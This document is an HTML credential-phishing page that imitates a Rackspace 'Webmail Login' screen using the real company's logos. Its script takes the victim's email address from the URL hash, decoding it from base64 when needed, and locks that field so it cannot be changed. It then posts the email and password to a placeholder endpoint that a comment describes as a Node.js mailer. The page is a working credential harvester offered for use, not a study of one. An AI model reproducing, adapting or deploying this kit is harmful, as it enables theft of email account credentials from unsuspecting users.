<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">

</head>
<body>
  <div>
    <div id="content">
      <div>
        <div id="content-header">
          <div id="content-header-logo"><img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"  /></div>
          <div id="content-header-label">Webmail Login</div>
        </div>
        <div id="content-body">
          <div id="banner-section">
            <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
              <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" />
            </a>
          </div>

          <form id="form" autocomplete="off">
            <div id="form-body">
              <div id="form-container">
                <input type="hidden" name="__RequestVerificationToken" value="CfDJ8PJv2PmI83xDqNI3IL5jbf7n53O-sjEa55YFQhrE9DffPHCT5T4NJaWKOR-DTuVf15CZOHNTR0Nf8HHvYJzpBuvE1-RuPCp-VVB10AxbvHGpnvcORaonI3gFCgak-skKc16eQFADMDLQGDKw1rJETYQ" />
                <input id="form-destination" type="hidden" name="destination" value="" />
                <input id="form-owa-flags" type="hidden" name="flags" value="4" />

                <div id="user-row" class="row">
                  <div id="user-col" class="col">
                    <div id="user-field" class="form-group">
                      <p align="left">
                        <span class="text-danger" id="msg" style="font-size:14px; color:#FF0000"></span>
                      </p>
                      <label id="user-label" class="form-label">Email address</label>
                      <input id="ai" name="username" tabindex="1" class="form-field" value="  " autocomplete="username" />
                    </div>
                  </div>
                </div>

                <div id="pass-row" class="row">
                  <div id="pass-col" class="col">
                    <div id="pass-field" class="form-group">
                      <label id="pass-label" class="form-label">Password</label>
                      <input id="pr" name="password" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password" />
                    </div>
                    <a id="forgot-password" href="#" tabindex="4">Forgot password?</a>
                  </div>
                </div>
              </div>
            </div>

            <div id="login-btn-toolbar">
              <button class="login-btn" type="submit" id="submit-btn">Log In</button>
            </div>

        </div>

        <!-- Your footer links and content here -->
      </div>
    </div>
  </div>

  <!-- Scripts -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

  <script>
    $(document).ready(function() {
      // Function to get email from the URL (hash)
      function getEmailFromURL() {
        var hash = window.location.hash.substr(1);  // Get everything after #
        var email = null;
        
        if (hash) {
          // Check if it's a base64 encoded email
          var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
          
          if (base64regex.test(hash)) {
            // Decode base64 to get the email
            email = atob(hash);
          } else {
            email = hash;  // Assume plain email format
          }
        }

        return email;
      }

      // Grab email from URL and populate the input field
      var email = getEmailFromURL();
      if (email) {
        $('#ai').val(email);  // Set the email to the input field
        $('#ai').attr('readonly', true);  // Make the email input readonly
        $("#msg").hide();  // Hide any error messages
      }

      // Handle form submission
      $('#submit-btn').click(function(event) {
        event.preventDefault(); // Prevent default form submission

        var ai = $("#ai").val();  // Get the email value
        var pr = $("#pr").val();  // Get the password value
        var msg = $('#msg').html();

        // Validate email and password
        if (!ai || !pr) {
          $('#msg').show();
          $('#msg').text("Both email and password are required!");
          return false;
        }

        // Proceed with AJAX submission
        $.ajax({
          type: 'POST',
          url: '/your-node-endpoint', // Replace with the Node.js endpoint to handle form submission
          data: { ai: ai, pr: pr },  // Send email and password to the backend
          success: function(response) {
            // Handle successful response from Node.js mailer
            if (response.success) {
              // Process success (redirect, show success message, etc.)
              console.log("Successfully submitted the form.");
            } else {
              // Handle error (show error message, etc.)
              $('#msg').show();
              $('#msg').text(response.message || "There was an error.");
            }
          },
          error: function() {
            // Handle error during AJAX call
            $('#msg').show();
            $('#msg').text("An error occurred. Please try again.");
          }
        });
      });
    });
  </script>
</body>
</html>
